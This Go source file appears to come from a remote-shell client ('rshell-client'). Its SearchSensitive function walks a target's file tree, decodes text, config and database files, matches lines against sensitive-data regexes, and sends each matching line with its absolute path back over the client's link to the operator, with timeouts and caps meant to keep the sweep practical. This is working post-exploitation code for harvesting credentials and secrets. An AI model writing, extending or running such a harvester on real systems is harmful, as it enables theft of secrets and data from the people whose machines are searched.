package commands

import (
	"rshell-client/shared/link"
	"bytes"
	"context"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/saintfish/chardet"
	"golang.org/x/text/encoding"
	"golang.org/x/text/encoding/htmlindex"
	"golang.org/x/text/transform"
)

func compileRegexes(list []string) ([]*regexp.Regexp, error) {
	var compiled []*regexp.Regexp
	for _, r := range list {
		re, err := regexp.Compile(r)
		if err != nil {
			return nil, err
		}
		compiled = append(compiled, re)
	}
	return compiled, nil
}

func isBlacklisted(line []byte) bool {
	for _, b := range SensitiveBlacklist {
		if bytes.Contains(line, []byte(b)) {
			return true
		}
	}
	return false
}

func detectEncoding(content []byte) (encoding.Encoding, error) {
	if utf8Valid(content) {
		return encoding.Nop, nil
	}
	detector := chardet.NewTextDetector()
	result, err := detector.DetectBest(content)
	if err != nil {
		return nil, err
	}
	return htmlindex.Get(result.Charset)
}

func utf8Valid(b []byte) bool {
	i := 0
	for i < len(b) {
		if b[i] < 0x80 {
			i++
		} else if b[i] < 0xC0 {
			return false
		} else if b[i] < 0xE0 {
			if i+1 >= len(b) || b[i+1]&0xC0 != 0x80 {
				return false
			}
			i += 2
		} else if b[i] < 0xF0 {
			if i+2 >= len(b) || b[i+1]&0xC0 != 0x80 || b[i+2]&0xC0 != 0x80 {
				return false
			}
			i += 3
		} else if b[i] < 0xF8 {
			if i+3 >= len(b) || b[i+1]&0xC0 != 0x80 || b[i+2]&0xC0 != 0x80 || b[i+3]&0xC0 != 0x80 {
				return false
			}
			i += 4
		} else {
			return false
		}
	}
	return true
}

func matchFileType(path string) bool {
	ext := filepath.Ext(path)
	if ext == "" {
		return false
	}
	allExts := SensitiveFileTypes["text"] + SensitiveFileTypes["config"] + SensitiveFileTypes["database"]
	return strings.Contains(allExts, ext+",")
}

// 搜索限制常量
const (
	maxFileSize     = 10 * 1024 * 1024 // 跳过大于10MB的文件
	maxTotalMatches = 5000              // 最多报告5000条匹配结果
	searchTimeout   = 120               // 搜索最多执行120秒
)

func isSkipDir(name string) bool {
	nameLower := strings.ToLower(name)
	for _, skip := range SensitiveDirNamesToSkip {
		if strings.ToLower(skip) == nameLower {
			return true
		}
	}
	return false
}

func SearchSensitive(rootPath string) {
	compiledRegexes, err := compileRegexes(SensitiveRegexList)
	if err != nil {
		link.ReportData(31, []byte("[!] Failed to compile regex rule: "+err.Error()+"\n"))
		return
	}

	ctx, cancel := context.WithTimeout(context.Background(), searchTimeout*time.Second)
	defer cancel()

	totalMatches := 0

	filepath.Walk(rootPath, func(path string, info os.FileInfo, err error) error {
		// 超时检查
		select {
		case <-ctx.Done():
			link.ReportData(0, []byte("[!] Sensitive search timed out, terminated\n"))
			return fmt.Errorf("search timeout")
		default:
		}

		if err != nil {
			return nil
		}
		if info == nil {
			return nil
		}

		if info.IsDir() {
			if isSkipDir(info.Name()) {
				return filepath.SkipDir
			}
			return nil
		}

		if !matchFileType(path) {
			return nil
		}

		// 跳过超大文件，防止OOM
		if info.Size() > maxFileSize {
			return nil
		}

		// 达到最大匹配数后跳过文件内容扫描，只继续遍历目录
		if totalMatches >= maxTotalMatches {
			return nil
		}

		content, err := os.ReadFile(path)
		if err != nil {
			return nil
		}

		enc, err := detectEncoding(content)
		if err != nil {
			return nil
		}

		reader := transform.NewReader(bytes.NewReader(content), enc.NewDecoder())
		decoded, err := io.ReadAll(reader)
		if err != nil {
			return nil
		}

		var matchedLines []string
		for _, line := range bytes.Split(decoded, []byte{'\n'}) {
			if isBlacklisted(line) {
				continue
			}
			lineStr := strings.TrimSpace(string(line))
			if lineStr == "" {
				continue
			}

			for _, re := range compiledRegexes {
				match := re.FindStringSubmatch(lineStr)
				if len(match) > 1 {
					matchedLines = append(matchedLines, "  "+lineStr)
					break
				}
			}
		}

		if len(matchedLines) > 0 {
			totalMatches += len(matchedLines)
			absPath, _ := filepath.Abs(path)
			var buf bytes.Buffer
			buf.WriteString(fmt.Sprintf("File: %s\n", absPath))
			for _, ml := range matchedLines {
				buf.WriteString(ml + "\n")
			}
			link.ReportData(47, buf.Bytes())
		}

		return nil
	})

	link.ReportData(0, []byte(fmt.Sprintf("[+] Sensitive search finished, %d matches found\n", totalMatches)))
}
